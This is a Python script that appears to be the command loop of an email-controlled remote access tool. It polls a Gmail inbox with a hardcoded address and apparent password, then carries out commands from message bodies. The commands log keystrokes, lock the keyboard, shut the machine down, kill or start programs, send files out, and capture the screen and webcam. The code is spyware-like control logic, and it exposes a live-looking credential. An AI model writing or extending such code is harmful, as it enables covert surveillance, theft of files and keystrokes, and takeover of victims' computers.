import time
import ManagerScreen
import live_screen_server
import MailBox
import ManagerKeyboard
import ManagerSystem
import ManagerSoft
import ManagerFile
import ManagerWebcam
import ManagerAudio
import FactoryOutLook
import FactoryGmail
import FactoryGmailApi

def utilPath(rep):
    return rep.split("\n")[-1]

def listen(msg,email):
    string = msg.lower().strip().split()
    rep = ""
    if "mapi" == string[0]:
        if "keyboard" == string[1]:
            keyboard = ManagerKeyboard.ManagerKeyBoard(email)
            if "lock" == string[2]:
                keyboard.lock()
            elif "unlock" == string[2]:
                keyboard.unlock()
            elif "state" == string[2]:
                keyboard.notificationState()
            elif "hook" == string[2]:
                if string[-1] == "hook":
                    number = 1
                else:
                    number = int(string[-1])
                keyboard.hook(minute = number)

        if "system" == string[1]:
            system = ManagerSystem.ManagerSystem(email)
            if "shutdown" == string[2]:
                system.shutdown()
            elif "logout" == string[2]:
                system.logout()

        if "soft" == string[1]:
            soft = ManagerSoft.ManagerSoft(email)
            if "list" == string[2]:
                soft.list(msg)
            if "kill" == string[2]:
                soft.kill(msg)
            if "start" == string[2]:
                soft.start(msg)

        if "file" == string[1]:
            file = ManagerFile.ManagerFile(email)
            if "list" == string[2]:
                file.list(msg)
            if "send" == string[2]:
                file.send(msg)

        if "screen" == string[1]:
            screen = ManagerScreen.ManagerScreen(email)
            if "scap" == string[2]:
                screen.scap()

        if "webcam" == string[1]:
            cam = ManagerWebcam.ManagerWebcam(email)
            if "scap" == string[2]:
                cam.turnOn()
                cam.capPicture()
                cam.turnOff()
            if "on" == string[2]:
                cam.turnOn()
            if "off" == string[2]:
                cam.turnOff()
        if "audio" == string[1]:
            audio = ManagerAudio.ManagerAudio(email,email.getFiles())
            if "play" == string[2]:
                audio.play()
            if "stop" == string[2]:
                audio.stop()

    return msg + "\nREP:\n" + rep


#mailBox = MailBox.MailBox()

while True:
    mails  = FactoryGmailApi.FactoryGmailApi("phucka25@gmail.com","Khutaosong21").createMailBox()
    print(len(mails))
    for mailNow in mails:
        if(mailNow.isValidate()):
            rep = listen(mailNow.getBody(),mailNow)
            print(rep)
        else:
            print("False" + mailNow.getBody())


    #print(mailDefault.Sendername)
    #print(mailDefault.subject)
    #print(mailDefault.Body)
    #print(datetime.now().time())
    #print(mailDefault.ReceivedTime.time())
    #print()
    #print(type(mailDefault.ReceivedTime))
    #print(type(datetime.now().time()))
    #print("____________________")
    time.sleep(5)